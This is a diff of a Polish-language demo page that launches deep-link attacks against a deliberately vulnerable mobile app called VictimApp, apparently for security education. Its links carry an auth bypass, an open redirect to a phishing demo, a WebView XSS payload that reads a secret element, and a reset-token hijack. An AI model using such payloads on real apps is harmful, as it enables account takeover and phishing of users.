@@ -4,38 +4,38 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Uruchom ataki — demo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Dekko&family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/styles.css">
 </head>
 <body>
-    <main class="container">
-        <div class="banner">⚠️ Edukacyjne linki demonstracyjne. Otwórz tę stronę na telefonie z zainstalowanym VictimApp.</div>
-
-        <h1>Uruchom scenariusze</h1>
-        <p class="muted">Kliknij link, aby wywołać deep link <span class="mono">victimapp://</span> w aplikacji.
-            Przydatne, gdy aparat nie otwiera własnych schematów URI.</p>
+    <main class="container" style="padding-top: 40px; padding-bottom: 40px;">
+        <h1 class="display" style="font-size: 40px; color: var(--brown); margin: 0 0 8px;">Uruchom ataki</h1>
+        <p class="note">⚠️ Edukacyjne linki demonstracyjne. Otwórz tę stronę na telefonie z zainstalowanym VictimApp.</p>
 
         <div class="card">
             <h2>Auth Bypass</h2>
             <p class="mono">victimapp://account</p>
-            <a class="btn" href="victimapp://account">Uruchom Auth Bypass</a>
+            <a class="btn btn--full" href="victimapp://account">Uruchom Auth Bypass</a>
         </div>
 
         <div class="card">
             <h2>Open Redirect</h2>
             <p class="mono">victimapp://redirect?url=…/phishing-demo</p>
-            <a class="btn" href="victimapp://redirect?url=https%3A%2F%2Fdeeplink-security-demo.vercel.app%2Fphishing-demo">Uruchom Open Redirect</a>
+            <a class="btn btn--full" href="victimapp://redirect?url=https%3A%2F%2Fdeeplink-security-demo.vercel.app%2Fphishing-demo">Uruchom Open Redirect</a>
         </div>
 
         <div class="card">
             <h2>WebView XSS</h2>
             <p class="mono">victimapp://xss?name=&lt;img src=x onerror=…&gt;</p>
-            <a class="btn" href="victimapp://xss?name=%3Cimg%20src%3Dx%20onerror%3D%22alert(document.getElementById('secret').textContent)%22%3E">Uruchom WebView XSS</a>
+            <a class="btn btn--full" href="victimapp://xss?name=%3Cimg%20src%3Dx%20onerror%3D%22alert(document.getElementById('secret').textContent)%22%3E">Uruchom WebView XSS</a>
         </div>
 
         <div class="card">
             <h2>Deep Link Hijacking</h2>
             <p class="mono">victimapp://reset/confirm?token=DEMO_RESET_TOKEN_123</p>
-            <a class="btn" href="victimapp://reset/confirm?token=DEMO_RESET_TOKEN_123">Uruchom Hijacking</a>
+            <a class="btn btn--full" href="victimapp://reset/confirm?token=DEMO_RESET_TOKEN_123">Uruchom Hijacking</a>
         </div>
     </main>
 </body>
